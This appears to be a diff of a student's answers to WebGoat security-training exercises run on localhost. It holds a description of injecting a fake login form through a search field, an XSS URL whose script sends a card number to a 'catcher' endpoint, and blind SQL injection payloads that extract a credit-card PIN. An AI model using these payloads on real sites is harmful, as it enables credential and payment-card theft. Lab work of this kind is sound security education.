@@ -2,10 +2,14 @@
 
 
 Part 1
-
+The vulnerability is that malicious HTML code could be injected through the search field in the 
+page. So in my code, a fake login interface is injected to the search frame. When a user use the
+Search functionality, the user may mistakenly think that a login is necessary. Once the user enters 
+Username and password, the information will be sent to the attacker.
 
 
 Part 2
+The 
 http://localhost:8090/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=<script>
 var card_num = document.getElementsByName("input1")[0].value;
 var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + card_num;
@@ -35,6 +39,10 @@ Part 7
 
 
 Part 8
+
+101 and (select pin from credit where cc_number = 1234123412341234) > 3310 and (select pin from credit where cc_number = 1234123412341234) < 3320
+
+101 and (select pin from credit where cc_number = 1234123412341234) = 3318
 
 
 
